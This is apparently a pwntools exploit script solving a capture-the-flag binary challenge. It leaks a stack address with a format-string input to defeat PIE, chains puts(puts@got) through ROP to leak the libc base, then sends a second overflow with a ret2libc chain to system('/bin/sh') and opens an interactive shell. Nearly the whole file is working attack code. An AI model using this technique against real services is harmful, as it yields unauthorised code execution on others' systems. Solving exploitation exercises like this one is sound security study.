#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template challenge
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "challenge")
libc = exe.libc

context.terminal = ["terminator", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
# Debuginfo:  Yes

# This challenges is basically just a PIE + ASLR bypass

io = start()

io.recvuntil(b"main\n")
io.sendline(b"%9$p")

address = int(io.recvline().decode(), 16)
exe.address = address - exe.symbols["main"] - 24

rop = ROP(exe)
rop.raw("A" * 24)  # 16 bytes for buffer + 8 bytes for rbp
rop.puts(exe.got["puts"])  # puts(puts@got) to leak libc puts randomized address
rop.raw(exe.sym["main"])  # Return back to main

io.sendline(rop.chain())

address = int.from_bytes(io.recvline()[:-1], byteorder="little")
libc.address = address - libc.symbols["puts"]
print(f"libc base: {hex(libc.address)}")

rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh\x00"))
print(p64(rop.rdi.address))

io.sendline("bleh")

io.sendline(
    b"A" * 24
    + p64(rop.rdi.address)
    + p64(binsh)
    + p64(rop.ret.address)
    + p64(libc.sym["system"])
)

io.interactive()
